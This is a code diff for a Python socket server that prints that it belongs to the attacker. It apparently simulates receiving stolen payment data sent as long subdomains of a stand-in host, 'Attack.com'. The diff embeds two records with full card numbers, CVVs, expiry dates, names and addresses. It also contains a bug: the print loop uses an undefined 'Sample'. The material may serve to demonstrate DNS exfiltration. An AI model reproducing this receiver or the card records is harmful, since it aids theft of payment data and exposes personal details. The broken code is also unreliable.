@@ -11,7 +11,28 @@ import numpy as np
 
 import socket
 
+Sample1={'Number': '5195691061804696',
+'CVV': '862',
+'Expiry': '01/29',
+'Name': 'Mary West',
+'Address': 'Avenida Camarillo, Indio, CA, 92203'
+}
 
+Sample2={'Number': '5122613957048590',
+'CVV': '765',
+'Expiry': '09/25', 
+'Name': 'Ramon Diaz',
+'Address': '214 vineland st Pittsburgh, PA, 15234'
+}
+
+
+
+DOLOS={'sinioecmntnonns.kimik.maohciemwnceo6se.g1o.iaocpt0swebev-bporn07c01.Attack.com':Sample1,
+ 'rmnts.nromtecsnrkenss.oatocfirmrpi22srdbe6t.r2g88cavr2t8.envceroscmt1b.Attack.com': Sample2 }
+
+print('\n\n*** This is the receiving server belongin to the attacker***\n\n')
+        
+        
 host = ''
 port = 10000
 backlog = 5
@@ -24,4 +45,11 @@ while 1:
     data = client.recv(size)
     if data:
         bits = data.decode()
+    sample= DOLOS.get(bits)
+    print('*** Received query ***\n')
+    print('.'.join(bits.split('.')[0:-2]) +'\n\n')
+    print('Decoded as follows:\n')
+    for key in Sample:
+      print(key+': '+ Sample.get(key))
+    print('\n\n')
     client.close()
